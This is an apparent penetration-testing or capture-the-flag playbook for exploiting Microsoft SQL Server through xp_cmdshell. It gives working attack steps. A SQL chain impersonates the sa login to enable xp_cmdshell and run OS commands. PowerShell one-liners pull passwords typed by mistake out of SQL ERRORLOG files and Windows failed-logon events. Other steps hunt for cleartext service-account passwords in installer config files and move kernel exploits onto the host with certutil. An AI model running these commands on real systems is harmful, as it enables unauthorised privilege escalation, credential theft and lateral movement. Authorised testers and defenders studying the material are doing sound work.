# MSSQL `xp_cmdshell` Exploitation

## When this applies

- MSSQL access obtained (via hardcoded creds in binaries, config files, or SQLi).
- Your login is sysadmin OR has `IMPERSONATE` on a sysadmin login.
- Goal: run OS commands as the SQL service account.

## Technique

`xp_cmdshell` is a stored procedure that runs OS commands as the SQL service account. Disabled by default; enable via `sp_configure`. If your login is not sysadmin, use `EXECUTE AS LOGIN = 'sa'` if you have IMPERSONATE.

## Steps

### `EXECUTE AS LOGIN = 'sa'` privesc — IMPERSONATE permission gives sysadmin

When a low-priv MSSQL login (e.g., `sql_svc`, an app's connection user) holds `IMPERSONATE` on `sa` (default if it owns DBs created by sa, or via explicit `GRANT IMPERSONATE ON LOGIN::sa TO X`), one statement upgrades to sysadmin and enables xp_cmdshell. Detect via:

```sql
-- list logins you can impersonate (run as the foothold login)
SELECT * FROM sys.server_permissions p JOIN sys.server_principals sp ON p.grantor_principal_id = sp.principal_id WHERE p.permission_name = 'IMPERSONATE';
```

```sql
-- single-statement chain: impersonate sa → enable advanced options → enable xp_cmdshell → RCE as the SQL service account
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',          1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /all';
REVERT;
```

This is the standard "admin SQL terminal in a web app + low-priv MSSQL login" → RCE chain. Verifies in one round-trip; no NTLM coercion needed.

## MSSQL Exploitation Gotchas

- `xp_cmdshell` creates a RESTRICTED token — even if the service account has SeImpersonatePrivilege in GPO, xp_cmdshell strips it. Potato attacks fail.
- `sp_OACreate` (OLE Automation) runs in the SAME restricted token as xp_cmdshell — NOT a separate elevated context.
- `xp_servicecontrol 'start', 'SQLSERVERAGENT'` fails with Access Denied when MSSQL runs as a domain user with limited OS privileges. SQL Agent cannot be started from SQL Server in this config.
- **`sa` on AD-joined hosts is a LOCAL SQL login** — `nxc mssql HOST -u sa -p pass` returns `STATUS_LOGON_FAILURE / "untrusted domain"`. Add `--local-auth` (also works for `crackmapexec mssql`, `mssqlclient.py -windows-auth` is the wrong flag here — drop windows-auth, use SQL auth + local-auth on netexec). Same applies to any non-domain SQL login (sa, sql_admin, etc.).
- **If no SeImpersonate and no potato path**: Check OS patch level for kernel EoP (CVE-2024-30088, CVE-2023-28252). Transfer exploit via base64+certutil.

## SQL ERRORLOG / Event 4625 password disclosure

When a user accidentally types their password into the *username* field at any Windows/SQL login prompt, the failed-login event records the username verbatim. After foothold on a SQL host or DC, always grep:

```powershell
# MSSQL: ERRORLOG and ERRORLOG.BAK preserve the typed-as-username string in cleartext
Select-String -Path 'C:\Program Files\Microsoft SQL Server\*\MSSQL\Log\ERRORLOG*' -Pattern 'Login failed for user'
Get-Content C:\SQLServer\Logs\ERRORLOG*,C:\Program*\Microsoft*\MSSQL*\Log\ERRORLOG* 2>$null | Select-String 'Login failed'
# Windows: 4625 (Failed Logon) — Account Name field sometimes holds the password
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -ErrorAction SilentlyContinue |
  Format-List @{N='User';E={$_.Properties[5].Value}},@{N='Domain';E={$_.Properties[6].Value}},TimeCreated
```

5-second check that often short-circuits a privesc chain. See also `errorlog-secrets.md`.

## Post-RCE filesystem cred hunt

Once xp_cmdshell lands you on disk, the SQL Server installer leaves credentials in cleartext on the box itself. Always read installer config files before pivoting back to the network:

- `C:\Program Files\Microsoft SQL Server\<ver>\Setup Bootstrap\Log\<TS>\ConfigurationFile.ini`
- `C:\SQL<ver>\<EDITION>\sql-Configuration.INI` (Express setups)
- Look for `SQLSVCPASSWORD=`, `AGTSVCPASSWORD=`, `RSSVCPASSWORD=`, `SAPWD=`. These are the **as-installed** service-account passwords in cleartext. If `sql_svc` (or any service-account) password matches a domain user (a common pivot in shared-credential environments), you have lateral creds for free. Also grep `*.config`, `web.config`, `appsettings.json`, scheduled-task XML under `C:\Windows\System32\Tasks\`, and `unattend.xml`.

## Verifying success

- `EXEC xp_cmdshell 'whoami /all'` returns the SQL service account's identity.
- `EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt'` prints the file contents.

## Common pitfalls

- xp_cmdshell strips SeImpersonate via restricted token — Potato variants fail.
- `sa` on AD-joined hosts is a LOCAL SQL login — use `--local-auth` on netexec.
- SQL Agent can't be started from SQL Server when MSSQL runs as a domain user with limited OS privs.

## Tools

- mssqlclient.py (impacket)
- nxc mssql
- sqsh / sqlcmd
